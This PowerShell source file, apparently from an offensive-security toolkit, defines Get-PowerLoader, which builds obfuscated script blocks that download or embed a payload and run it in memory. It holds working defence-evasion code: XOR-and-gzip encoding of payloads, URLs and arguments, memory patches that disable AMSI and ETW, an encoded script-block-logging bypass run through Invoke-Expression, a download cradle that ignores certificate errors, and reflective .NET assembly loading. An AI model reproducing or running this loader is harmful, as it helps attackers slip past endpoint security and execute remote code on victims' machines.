function Get-PowerLoader {
<#
.SYNOPSIS
    Build script block which safely loads PowerShell or .NET assembly.

    Author: Timothee MENOCHET (@_tmenochet)

.DESCRIPTION
    Get-PowerLoader returns PowerShell script block embedding download cradle or local file as payload.

.PARAMETER Type
    Specifies the payload type, defaults to PoSH.

.PARAMETER FilePath
    Specifies a local payload.

.PARAMETER FileUrl
    Specifies a remote payload.

.PARAMETER ArgumentList
    Specifies the payload arguments.

.PARAMETER Bypass
    Specifies the bypass techniques to include.

.PARAMETER ClearComments
    Removes comments from PowerShell payload to be loaded.

.EXAMPLE
    PS C:\> Get-PowerLoader -Type PoSh -FileUrl 'https://192.168.0.1/script.ps1' -ArgumentList 'Invoke-Sample','-Verbose' -Bypass AMSI,SBL

.EXAMPLE
    PS C:\> Get-PowerLoader -Type NetAsm -FilePath .\sharp.exe -Bypass AMSI,ETW | Invoke-PowerExec -ComputerList 192.168.0.2
#>
    [CmdletBinding()]
    Param (
        [ValidateSet("PoSh","NetAsm")]
        [string]
        $Type = "PoSh",

        [ValidateScript({Test-Path $_ -PathType Leaf})]
        [string]
        $FilePath,

        [string]
        $FileUrl,

        [ValidateNotNullOrEmpty()]
        [string[]]
        $ArgumentList,

        [ValidateSet("AMSI","ETW","SBL")]
        [string[]]
        $Bypass,

        [Switch]
        $ClearComments
    )

    $srcCode = ${function:Get-DecodedBytes}.Ast.Extent.Text + [Environment]::NewLine
    if ($FilePath) {
        $bytes = [IO.File]::ReadAllBytes((Resolve-Path $FilePath))
        if ($ClearComments -and $Type -eq "PoSh") {
            $bytes = Remove-PoshComments($bytes)
        }
        $bytes = $bytes | foreach {$_ -bxor 1}
        $encCode = Get-EncodedBytes($bytes)
        $srcCode += '$code = Get-DecodedBytes("' + $encCode + '") | foreach {$_ -bxor 1}' + [Environment]::NewLine
    }
    elseif ($FileUrl) {
        $srcCode += ${function:Invoke-DownloadCradle}.Ast.Extent.Text + [Environment]::NewLine
        $bytes = [Text.Encoding]::UTF8.GetBytes($FileUrl)
        $bytes = $bytes | foreach {$_ -bxor 1}
        $encUrl = Get-EncodedBytes($bytes)
        $srcCode += '$code = Invoke-DownloadCradle([Text.Encoding]::UTF8.GetString($(Get-DecodedBytes("' + $encUrl + '") | foreach {$_ -bxor 1})))' + [Environment]::NewLine
        if ($ClearComments -and $Type -eq "PoSh") {
            $srcCode += ${function:Remove-PoshComments}.Ast.Extent.Text + [Environment]::NewLine
            $srcCode += '$code = Remove-PoshComments($code)' + [Environment]::NewLine
        }
    }
    else {
        Write-Error "Either FilePath or FileUrl parameter must be specified" -ErrorAction Stop
    }

    if ($ArgumentList) {
        $args = $ArgumentList -join ','
        $bytes = [Text.Encoding]::UTF8.GetBytes($args)
        $bytes = $bytes | foreach {$_ -bxor 1}
        $encArgs = Get-EncodedBytes($bytes)
        $srcArgs = '$args = $([Text.Encoding]::UTF8.GetString($(Get-DecodedBytes("' + $encArgs + '") | foreach {$_ -bxor 1}))).Split('','')' + [Environment]::NewLine
    }
    else {
        $srcArgs = '$args = $null' + [Environment]::NewLine
    }

    $srcBypass = ''
    if ($Bypass -and ($Bypass.Contains('AMSI') -or $Bypass.Contains('ETW'))) {
        $srcBypass += ${function:Invoke-MemoryPatch}.Ast.Extent.Text + [Environment]::NewLine
    }
    switch ($Bypass) {
        'AMSI' {
            $srcBypass += '$d = $([Text.Encoding]::UTF8.GetString($(Get-DecodedBytes("H4sIAAAAAAAEAEvIKcrQT83NBQCpd2pDCAAAAA==") | foreach {$_ -bxor 1})))' + [Environment]::NewLine
            $srcBypass += '$f = $([Text.Encoding]::UTF8.GetString($(Get-DecodedBytes("H4sIAAAAAAAEAHPIKcoISkrIdy5JT08pBgCSRCbiDgAAAA==") | foreach {$_ -bxor 1})))' + [Environment]::NewLine
            $srcBypass += 'if ([Environment]::Is64BitOperatingSystem) {$p = [byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)} else {$p = [byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00)}' + [Environment]::NewLine
            $srcBypass += 'Invoke-MemoryPatch -Dll $d -Func $f -Patch $p' + [Environment]::NewLine
        }
        'ETW' {
            $srcBypass += '$d = $([Text.Encoding]::UTF8.GetString($(Get-DecodedBytes("H4sIAAAAAAAEAMsvTc3N1QdiALm3ONgJAAAA") | foreach {$_ -bxor 1})))' + [Environment]::NewLine
            $srcBypass += '$f = $([Text.Encoding]::UTF8.GetString($(Get-DecodedBytes("H4sIAAAAAAAEAHMpLXMpT8kvDSvOKE0BAGFTlzkNAAAA") | foreach {$_ -bxor 1})))' + [Environment]::NewLine
            $srcBypass += 'if ([Environment]::Is64BitOperatingSystem) {$p = [byte[]] (0xc3)} else {$p = [byte[]] (0xc2, 0x14, 0x00, 0x00)}' + [Environment]::NewLine
            $srcBypass += 'Invoke-MemoryPatch -Dll $d -Func $f -Patch $p' + [Environment]::NewLine
        }
        'SBL' {
            $srcBypass += '$b = "H4sIAAAAAAAEADWOUUsDMRCEf8s9GO6gR/5CUVAEsXhihdKHJdmmW71NuE1WQumPNyf4OMN8M6O5Xg/veD7arQjOnqt9RP2oCw5mqqI42xdIEHDGpHZbNM6gFJOdXKZFHzi6L9OvzBMhnwYjFBJoyShmNLuY3opncqNow1xLTqifwAWHu1SYx2GHP5tX/41Ou//B+8jcdFuRVpwwk7PPIJeGHkQzpXA0fX9zoO5y3WdS3Owhp+a3ir9bnV9/dRxDWF1fFxDpzkCMJ2tuvxHo1jL1AAAA"' + [Environment]::NewLine
            $srcBypass += 'IEX $([Text.Encoding]::UTF8.GetString($(Get-DecodedBytes($b) | foreach {$_ -bxor 1})))' + [Environment]::NewLine
        }
    }

    switch ($Type) {
        'PoSh' {
            $srcLoader = ${function:Invoke-PoshLoader}.Ast.Extent.Text + [Environment]::NewLine
            $srcLoader += 'Invoke-PoshLoader -Code $([Text.Encoding]::UTF8.GetString($code)) -ArgumentList $args'
        }
        'NetAsm' {
            $srcLoader = ${function:Invoke-NetLoader}.Ast.Extent.Text + [Environment]::NewLine
            $srcLoader += 'Invoke-NetLoader -Code $code -ArgumentList $args'
        }
    }
    $script = $srcCode + $srcArgs + $srcBypass + $srcLoader
    return [ScriptBlock]::Create($script)
}

function Local:Remove-PoshComments {
    Param (
        [byte[]] $Bytes
    )

    $strBytes = [BitConverter]::ToString($Bytes)
    $strBytes = $strBytes -replace "3C-23-(.*?)-23-3E"
    $strBytes = $strBytes -replace "23-(.*?)-0A","0A"
    $strBytes = $strBytes -replace "-"
    $byteArray = New-Object Byte[] ($strBytes.Length / 2)
    for ($i = 0; $i -lt $strBytes.Length; $i += 2) {
        $byteArray[$i/2] = [convert]::ToByte($strBytes.Substring($i, 2), 16)
    }
    return $byteArray
}

function Local:Get-EncodedBytes {
    Param (
        [Parameter(Mandatory = $True)]
        [byte[]] $ByteArray
    )

    [IO.MemoryStream] $output = New-Object System.IO.MemoryStream
    $gzipStream = New-Object System.IO.Compression.GzipStream $output, ([IO.Compression.CompressionMode]::Compress)
    $gzipStream.Write($ByteArray, 0, $ByteArray.Length)
    $gzipStream.Close()
    $output.Close()
    $out = $output.ToArray()
    return [Convert]::ToBase64String($out)
}

function Local:Get-DecodedBytes {
    Param (
        [Parameter(Mandatory = $True)]
        [string] $EncBytes
    )

    $byteArray = [Convert]::FromBase64String($EncBytes)
    $input = New-Object System.IO.MemoryStream(,$byteArray)
    $output = New-Object System.IO.MemoryStream
    $gzipStream = New-Object System.IO.Compression.GzipStream $input, ([IO.Compression.CompressionMode]::Decompress)
    $gzipStream.CopyTo($output)
    $gzipStream.Close()
    $input.Close()
    return $output.ToArray()
}

function Local:Invoke-MemoryPatch {
    Param (
        [string] $Dll,
        [string] $Func,
        [byte[]] $Patch
    )

    $win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
[DllImport("kernel32")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
[DllImport("kernel32")]
public static extern IntPtr LoadLibrary(string name);
[DllImport("kernel32")]
public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
    Add-Type $win32
    $address = [Win32]::GetProcAddress([Win32]::LoadLibrary($Dll), $Func)
    $a = 0
    $b = 0
    [Win32]::VirtualProtect($address, [UInt32]$Patch.Length, 0x40, [ref]$a) | Out-Null
    try {
        [Runtime.InteropServices.Marshal]::Copy($Patch, 0, $address, [UInt32]$Patch.Length)
    }
    catch {
        Write-Error "Memory patch failed."
    }
    finally {
        [Win32]::VirtualProtect($address, [UInt32]$Patch.Length, $a, [ref]$b) | Out-Null
    }
}

function Local:Invoke-DownloadCradle {
    Param (
        [Parameter(Mandatory=$True)]
        [string] $URL
    )

    $code = $null
    try {
        [Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        $client = [Net.WebRequest]::Create($URL)
        $client.Proxy = [Net.WebRequest]::GetSystemWebProxy()
        $client.Proxy.Credentials = [Net.CredentialCache]::DefaultCredentials
        $response = $client.GetResponse()
        $respStream = $response.GetResponseStream()
        $buffer = New-Object byte[] $response.ContentLength
        $writeStream = New-Object System.IO.MemoryStream $response.ContentLength
        do {
            $bytesRead = $respStream.Read($buffer, 0, $buffer.Length)
            $writeStream.Write($buffer, 0, $bytesRead)
        }
        while ($bytesRead -gt 0)
        $code = New-Object byte[] $response.ContentLength
        [Array]::Copy($writeStream.GetBuffer(), $code, $response.ContentLength)
        $respStream.Close()
        $response.Close()
    }
    catch [Net.WebException] {
        Write-Error $_
    }
    return $code
}

function Local:Invoke-PoshLoader {
    Param (
        [Parameter(Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [string] $Code,

        [string[]] $ArgumentList
    )

    Invoke-Expression "$Code $($ArgumentList -join ' ')"
}

function Local:Invoke-NetLoader {
    Param (
        [Parameter(Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [byte[]] $Code,

        [string[]] $ArgumentList
    )

    $output = New-Object IO.StringWriter
    [Console]::SetOut($output)
    $assembly = [Reflection.Assembly]::Load([byte[]]$Code)
    $al = New-Object -TypeName System.Collections.ArrayList
    $al.add($ArgumentList) | Out-Null
    try {
        $assembly.EntryPoint.Invoke($null, $al.ToArray())
    }
    catch [Management.Automation.MethodInvocationException] {
        Write-Warning $_
    }
    finally {
        Write-Output $output.ToString()
    }
}